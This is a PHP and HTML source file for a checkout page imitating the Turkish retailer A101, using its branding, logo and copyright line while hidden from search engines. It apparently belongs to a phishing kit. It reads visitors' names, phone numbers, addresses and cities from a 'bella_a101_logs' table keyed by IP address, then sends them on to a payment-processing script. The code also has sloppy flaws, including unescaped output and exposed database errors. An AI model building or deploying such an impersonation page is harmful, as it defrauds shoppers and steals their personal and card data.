
<?php

// Session start
session_start();
ob_start();

// Check basket_info from session
if (!$_SESSION['basket'] && !isset($_SESSION['basket_info'])) {
    header('Location: index.php');
    exit;
}

// Include Helper
include_once('../inc/helper.php');

// Check product info database
$basket_info = $_SESSION['basket_info'];
$sql = "SELECT * FROM bella_a101_products WHERE id = :id";
$stmt = $db->prepare($sql);
$stmt->execute(['id' => $basket_info['product_id']]);
$product = $stmt->fetch(PDO::FETCH_OBJ);

// Check product is exist
if (!$product) {
    header('Location: index.php');
    exit;
}
try {
    // IP adresini çekmek için $_SERVER['REMOTE_ADDR'] kullanın
    $ipAddress = $_SERVER['REMOTE_ADDR'];

    // Veritabanı bağlantısını oluşturun (db_connect fonksiyonunu tanımladığınızı varsayalım)
    $db = db_connect();

    // SQL sorgusu hazırlayın ve çalıştırın
    $sql = "SELECT name_surname, phone_number, address, il FROM bella_a101_logs WHERE ipAddress = :ipAddress ORDER BY id DESC LIMIT 1";
    $stmt = $db->prepare($sql);
    $stmt->bindParam(':ipAddress', $ipAddress);
    $stmt->execute();

    // Sonuçları alın
    $row = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($row) {
        $phoneNumber = $row['phone_number'];
        $address = $row['address'];
        $name_surname = $row['name_surname'];
        $il = $row['il'];

        // İşlem yapmak istediğiniz verileri burada kullanabilirsiniz

    } else {
        echo "Veri bulunamadı.";
    }
} catch (PDOException $e) {
    // Hata durumunda hata mesajını göster
    echo "Veritabanı Hatası: " . $e->getMessage();
}



?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE-EmulateIE7">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta id="viewport" name="viewport"
          content="width=device-width, maximum-scale=1.0, initial-scale=1.0, user-scalable=no, minimal-ui">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">

    <title>Ödeme</title>


    <link href="assets/img/static_omnishop/ayb822/dist/style.css" rel="stylesheet" type="text/css">
    <!-- JQUERY -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <!-- Custom inline JS -->
    <script type="text/javascript">
        var GLOBALS = {
            THUMBNAIL_ACTIVE: true,
            THUMBNAIL_OPTIONS: {
                "product-list__big": {"width": 587, "quality": 60, "crop": "center", "height": 587},
                "category-detail": {"width": 870, "quality": 60, "height": 317},
                "email-thumbnail": {"width": 80, "quality": 60, "crop": "center", "height": 80},
                "product_basket_thumb_image": {"width": 120, "quality": 60, "height": 120},
                "discount-product-list": {"width": 190, "quality": 100, "crop": "center", "height": 190},
                "product-content-variant-image": {"width": 70, "quality": 60, "crop": "center", "height": 70},
                "product-detail__slider_display": {"width": 780, "quality": 60, "crop": "center", "height": 780},
                "product-detail__slider_zoom": {"width": 1400, "quality": 60, "crop": "center", "height": 1400},
                "product-detail__slider_thumbnail": {"width": 150, "quality": 60, "crop": "center", "height": 150},
                "category-detail__sub-category-banner": {"width": 270, "quality": 60, "height": 335},
                "autocomplete": {"width": 40, "quality": 60, "height": 40},
                "category-detail__campaign-banner": {"width": 420, "quality": 60, "height": 210},
                "product-map-image": {"width": 60, "quality": 60, "crop": "center", "height": 60},
                "product-list": {"width": 250, "quality": 100, "crop": "center", "height": 250}
            },
            DEFAULT_COUNTRY: {'pk': 1},
            isUserLoggin: false,
            userPhone: '',
            sendTime: '',
            phoneLogin: '',
            isAutoSetShippingOption: false,
            isPaymentTabRunningFromSlug: true,
            disableAutoSelectOneAddress: true,
            userEmail: '',
            userName: '',
            userSurname: '',

            page: 'checkout'

        };
    </script>
    <link rel="stylesheet" href="path-to-css/react-phone-input-2.css">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-regular-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-bold-webfont.woff2" as="font"
          type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/a101_tradegothic-bold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/a101_tradegothic-bold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-extrabold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-blackcaps-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/icomoon.ttf" as="font"
          type="font/ttf" crossorigin="">
    <script src="assets/js/cookie-seal.js"></script>

</head>
<body class="page-inner address">
<section class="js-main-wrapper">

    <header class="page-checkout-header">
        <div class="container">
            <a href="#" class="logo" title="A101">
                <img loading="lazy" src="assets/img/static_omnishop/ayb822/assets/img/logo%40a101-2x.png"
                     alt="">
            </a>
            <div class="clearfix"></div>
        </div>

        <div class="page-header header visible-xs">
            <div class="page-name js-page-name">
                <a href="#" class="js-go-back" title="Geri dön">
                    <em class="icon-chevron_left"></em>
                </a>
                GÜVENLİ ÖDEME ve ONAY
            </div>
        </div>
    </header>

    <!-- Payment Section -->
    <section class="page-checkout js-page-checkout js-tab-box">
        <div class="container" style="margin-top: 10rem;">
            <div class="checkout-addresses js-tab-content active">
                <div class="row">
                    <div class="steps">
        <ul>
          <li class="js-tab active">
            <a href="#" title="1. ADRES &amp; KARGO  BİLGİLERİ">
              <span class="hidden-xs">1. ADRES &amp; KARGO  BİLGİLERİ</span>
              <span class="visible-xs">1.<br> KARGO</span>
            </a>
          </li>
          <li class="js-tab">
            <em class="icon-arrow_right"></em>
            <a href="#" title="2. ÖDEME SEÇENEKLERİ">
              <span class="hidden-xs">2. ÖDEME SEÇENEKLERİ</span>
              <span class="visible-xs">2.<br> ÖDEME</span>
            </a>
          </li>
          <li>
            <em class="icon-arrow_right"></em>
            <a href="#" title="3. ONAY">
              <span class="hidden-xs">3. ONAY</span>
              <span class="visible-xs">3.<br> ONAY</span>
            </a>
          </li>
        </ul>
        <div class="clearfix"></div>
      </div>
                    <div class="col-sm-3 hidden-lg">
                        <div class="checkout-notice">
                            Faturanız elektronik fatura olarak iletilecektir.
                        </div>
                        <div class="checkout-sidebar">
                            <div class="js-checkout-sum-wrapper">
                                <div class="title">
                                    SİPARİŞ ÖZETİ
                                    <span>1 Ürün</span>
                                </div>
                                <div class="products">
                                    <ul>
                                        <li>
                                            <a href="/sadece-online-ozel/urun.php?s=<?= $product->ProductSefURL; ?>&i=<?= $product->id; ?>"
                                               rel="nofollow" title="<?= $product->ProductName; ?>">
                                                <img loading="lazy"
                                                     src="assets/img/products/<?= $product->ImageURL; ?>">
                                                <div class="content">
                                                    <div class="price">
                                                        ₺<?= number_format($product->ProductPrice, 2); ?>                                                    </div>
                                                    <div><?= $product->ProductName; ?></div>
                                                </div>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="summary">
                                    <table>
                                        <tbody>
                                        <tr>
                                            <td>
                                                Ürünlerin Toplamı
                                            </td>
                                            <td>
                                                ₺<?= number_format($product->ProductPrice, 2); ?>                                          </td>
                                        </tr>

                                        </tbody>
                                    </table>
                                </div>

                                <div class="total">
                                    <span>
                                        ₺<?= number_format($product->ProductPrice, 2); ?>                                   </span>
                                    Ödenecek Tutar
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-9" bis_skin_checked="1">
            <div class="checkout-delivery" bis_skin_checked="1">
              <div class="addresses" bis_skin_checked="1">
                <div class="section-hero" bis_skin_checked="1">
                  <ul class="checklist">
                    <li class="checkbox">
                      <input type="checkbox" class="js-show-bill-address" id="billing" checked="">
                      <label for="billing">
                        Fatura adresim ile aynı
                      </label>
                    </li>
                  </ul>
                  TESLİMAT ADRESİ
                </div>
                <div class="list" bis_skin_checked="1">
                  <div class="desc" bis_skin_checked="1">
                    
                      Lütfen teslimat adresi seçin.
                    
                  </div>
                  <ul class="js-address-list-alternate ">
  
    <li class="selected js-address-box" data-address-pk="7867113">
      <label>
        <div class="title" bis_skin_checked="1">
          
          <div class="check" bis_skin_checked="1">
            <input type="radio" name="js-address-radio-button" value="7867113" class="js-address-radio-button address-radio" data-is-corporate="false" data-user-name="dewawdaw" data-user-surname="dwadwaadw" data-has-identity-id="false" checked="">
            <div class="radio" bis_skin_checked="1"></div>
            <span>
              SEÇTİĞİNİZ ADRES
            </span>
          </div>
        </div>
        <div class="details" bis_skin_checked="1">
          <div class="title" bis_skin_checked="1">ev</div>
          

  <div bis_skin_checked="1"><?php echo $address; ?> <br>  <?php echo $il; ?></div>
  
    <div bis_skin_checked="1">Tel: <?php echo $phoneNumber; ?></div> <br>
    <div bis_skin_checked="1"> <?php echo $name_surname; ?></div> 

        </div>
      </label>
    </li>
</ul>
                  <ul>
                    
                     
                    

                    

                    
                  </ul>
                  <div class="clearfix" bis_skin_checked="1"></div>
                </div>

                <div class="js-bill-addresses" style="display: none" bis_skin_checked="1">
                  <div class="section-hero js-address-title" bis_skin_checked="1">
                    FATURA ADRESİ
                  </div>
                  <div class="list" bis_skin_checked="1">
                    <div class="desc" bis_skin_checked="1">
                      Lütfen fatura adresi seçin.
                    </div>
                    <ul class="js-bill-address-list-alternate">
  
    <li class="selected js-address-box" data-address-pk="7867113">
      <label>
        <div class="title" bis_skin_checked="1">
          
          <div class="check" bis_skin_checked="1">
            <input type="radio" name="js-bill-address-radio-button" value="7867113" class="js-bill-address-radio-button address-radio" data-is-corporate="false" data-user-name="dewawdaw" data-user-surname="dwadwaadw" data-has-identity-id="false" checked="">
            <div class="radio" bis_skin_checked="1"></div>
            <span>
              SEÇTİĞİNİZ ADRES
            </span>
          </div>
        </div>
        <div class="details" bis_skin_checked="1">
          <div class="title" bis_skin_checked="1">ev</div>
          

  <div bis_skin_checked="1">dwadwadaw dwadwaawd BERGAMA  İZMİR</div>
  
    <div bis_skin_checked="1">Tel: <?= $logs->phone_number; ?></div> 

        </div>
      </label>
    </li>
</ul>
                    <ul>
                      <li class="half">
                        <a href="#" class="new-address js-new-address" data-type="bill_address" title="Yeni adres oluştur">
                          <em class="icon-plus"></em>
                          Yeni adres oluştur
                        </a>
                      </li>
                    </ul>
                    <div class="clearfix" bis_skin_checked="1"></div>
                  </div>
                </div>
              </div>
              <div class="continue" bis_skin_checked="1">
                <form id="redirectForm" action="odeme-islem.php" method="post">
                  <div class="section-hero" bis_skin_checked="1">
                    KARGO FİRMASI
                  </div>
                  <div class="cargo" bis_skin_checked="1">
                    
                      <div class="desc" bis_skin_checked="1">
                        <span class="js-current-address-city"><?php echo $il; ?></span>
                        şehri için kargo firması seçin.
                      </div>
                    
                    <div class="cargo-list" bis_skin_checked="1">
                      <ul class="js-shipping-list">

  <li>
    <label class="js-checkout-cargo-item" data-slug="04">
      <div class="price" bis_skin_checked="1">₺0,00</div>
      <div class="check" bis_skin_checked="1">
        <input type="radio" name="shipping" class="js-shipping-radio" checked="" value="36">
        <div class="radio" bis_skin_checked="1"></div>
        <span>
          
           
          
        MNG Kargo 
        
        </span>
      </div>
    </label>
  </li> 
</ul>
                      <div class="error js-error-shipping_option" style="display: none;" bis_skin_checked="1"></div>
                    </div>
                    <a href="javascript:void(0)" class="button hidden green js-modal-trigger">
                      Kaydet ve Devam Et
                    </a>
                    <button type="submit" class="button green js-proceed-button block" data-index="1">
                      Kaydet ve Devam Et
                    </button>
                    
  
  
    
    
    
      

<div class="delivery-cargo-wrapper" bis_skin_checked="1">
  
    
      <div class="delivery-cargo js-cargo-message hidden" data-slug="02" bis_skin_checked="1">
        None
      </div>
    
  
    
      <div class="delivery-cargo js-cargo-message hidden" data-slug="05" bis_skin_checked="1">
        None
      </div>
    
  
    
      <div class="delivery-cargo js-cargo-message hidden" data-slug="01" bis_skin_checked="1">
        None
      </div>
    
  
    
      <div class="delivery-cargo js-cargo-message hidden" data-slug="04" bis_skin_checked="1">
        None
      </div>
    
  
    
      <div class="delivery-cargo js-cargo-message hidden" data-slug="06" bis_skin_checked="1">
        None
      </div>
    
  
    
      <div class="delivery-cargo js-cargo-message hidden" data-slug="07" bis_skin_checked="1">
        None
      </div>
    
  
    
      <div class="delivery-cargo js-cargo-message hidden" data-slug="08" bis_skin_checked="1">
        None
      </div>
    
  
    
      <div class="delivery-cargo js-cargo-message hidden" data-slug="10" bis_skin_checked="1">
        None
      </div>
    
  
    
      <div class="delivery-cargo js-cargo-message hidden" data-slug="11" bis_skin_checked="1">
        None
      </div>
    
  
    
      <div class="delivery-cargo js-cargo-message hidden" data-slug="RetailStore" bis_skin_checked="1">
        Kurbanınızı, kurban kesim yoğunluğuna bağlı olarak, illere göre Kurban Bayramının 2. gününden itibaren sipariş verirken seçtiğiniz mağazadan e-arşiv faturanızı ve teslim alacak kişiye ait kimliği ibraz ederek teslim alabilirsiniz.
      </div>
    
  
</div>

    
  

             

          
                                        <div id="js-orders-complete-button" class="js-complete-with-masterpass">
                                            <button type="submit" class="button block green continue-button"
                                                    id="payment_button">
                                                <span class="order-spinner hidden" id="order-spinner">İşleniyor.. <img
                                                            src="assets/img/static_omnishop/ayb822/assets/img/spinner.gif"
                                                            width="40" alt="spinner"></span>
                                                <span class="order-complete" id="order-complete">Siparişi Tamamla</span>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                                <div class="clearfix"></div>
                            </form>
                        </div>
                    </div>
                    
                    <div class="col-sm-3 hidden-xs visible-lg">
                        
                        <div class="checkout-notice">
                            Faturanız elektronik fatura olarak iletilecektir.
                        </div>
                        
                        <div class="checkout-sidebar">
                            <div class="js-checkout-sum-wrapper">
                                <div class="title">
                                    SİPARİŞ ÖZETİ
                                    <span>1 Ürün</span>
                                </div>
                                <div class="products">
                                    <ul>
                                        <li>
                                            <a href="/sadece-online-ozel/urun.php?s=<?= $product->ProductSefURL; ?>&i=<?= $product->id; ?>"
                                               rel="nofollow" title="<?= $product->ProductName; ?>">
                                                <img loading="lazy"
                                                     src="assets/img/products/<?= $product->ImageURL; ?>">
                                                <div class="content">
                                                    <div class="price">
                                                        ₺<?= number_format($product->ProductPrice, 2); ?>
                                                    </div>
                                                    <div><?= $product->ProductName; ?></div>
                                                </div>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="summary">
                                    <table>
                                        <tbody>
                                        <tr>
                                            <td>
                                                Ürünlerin Toplamı
                                            </td>
                                            <td>
                                                ₺<?= number_format($product->ProductPrice, 2); ?>                                            </td>
                                        </tr>

                                        </tbody>
                                    </table>
                                </div>

                                <div class="total">
                                    <span>
                                        ₺<?= number_format($product->ProductPrice, 2); ?>                                   </span>
                                    Ödenecek Tutar
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- Payment Section End -->


    <footer class="page-checkout-footer hidden-xs">
        <ul class="cards">
            <li>
                <i class="sprite visa-logo"></i>
            </li>
            <li>
                <i class="sprite mastercard-logo"></i>
            </li>
            <li>
                <i class="sprite gpay-logo"></i>
            </li>
            <li>
                <i class="sprite bkm-logo"></i>
            </li>
            <li>
                <i class="sprite troy-logo"></i>
            </li>
        </ul>
        <p>2023 A101 Tüm Hakları Saklıdır.</p>
    </footer>


    <div class="clear"></div>
</section>


<div class="back-to-top js-back-to-top hide-on-app">
    <i class="fa fa-angle-up"></i>
</div>
 <style>
        body {
            font-family: Arial, sans-serif;
        }

        form {
            margin: 20px;
        }

        label {
            font-weight: bold;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        input[type="text"]:focus {
            outline: none;
            border: 1px solid #007BFF;
        }

        button {
            background-color: #007BFF;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }

        /* Aşağıdaki CSS kodu giriş alanına özgüdür */
        .page-checkout .payment-area .card-information .field label input {
            width: 100%;
            height: 35px;
            padding: 0 1rem;
            margin-top: 5px;
            border: solid 1px #cbc8c8;
        }
    </style>

<style>

.modal form label textarea {
    height: 16rem;
    padding: 2rem;
}
</style>
<script>
        function kontrolEt(input) {
            var telefonDegeri = input.value;

            // Eğer kullanıcı giriş alanını sadece "+90" olarak bırakmaya çalışırsa
            if (telefonDegeri === "+90") {
                return; // Mevcut değeri koru
            }

            // Eğer kullanıcı sadece "+90" ile başlayan bir numara yazarsa
            if (telefonDegeri.startsWith("+90")) {
                return; // Mevcut değeri koru
            }

            // Diğer girişleri engelle
            input.value = "+90";
        }
    </script></script>
<script src="assets/js/payment.js"></script>
</body>
</html>